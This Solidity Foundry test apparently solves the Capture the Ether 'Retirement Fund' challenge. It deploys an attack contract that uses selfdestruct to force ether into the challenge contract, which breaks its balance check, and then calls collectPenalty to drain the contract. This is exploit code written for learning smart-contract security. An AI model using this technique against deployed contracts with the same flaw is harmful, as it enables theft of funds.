// SPDX-License-Identifier: UNLICENSED
pragma experimental ABIEncoderV2;
pragma solidity ^0.6.2;

import {Test, console} from "forge-std/Test.sol";
import {RetirementFundChallenge} from "../../src/2-Math/3-RetirementFund.sol";

contract RetirementFundTest is Test {
    address player;

    address challengeAddress;

    function setUp() public {
        player = makeAddr("player");
        RetirementFundChallenge challenge = new RetirementFundChallenge{value: 1 ether}(payable(player));
        challengeAddress = payable(address(challenge));

        vm.deal(player, 1 ether);
    }

    function testSolveRetirementFund() public {
        RetirementFundChallenge challenge = RetirementFundChallenge(payable(challengeAddress));

        // [START]

        // Deploy attack contract
        RetirementFundAttack attacker = new RetirementFundAttack(payable(challengeAddress));
        vm.prank(player);
        payable(address(attacker)).transfer(1 ether);
        console.log("attacker balance: ", address(attacker).balance);

        console.log("0. balance: ", address(challenge).balance);

        vm.prank(player);
        // payable(address(challenge)).transfer(1 ether); // fallback error
        attacker.attack();

        console.log("1. balance: ", address(challenge).balance);

        vm.prank(player);
        challenge.collectPenalty();

        console.log("2. balance: ", address(challenge).balance);

        // [END]

        assertTrue(challenge.isComplete());
    }

    receive() external payable {}
}

// Attack contract
contract RetirementFundAttack {
    address target;

    constructor(address _target) public {
        target = _target;
    }

    receive() external payable {}

    function attack() public payable {
        selfdestruct(payable(target));
    }
}
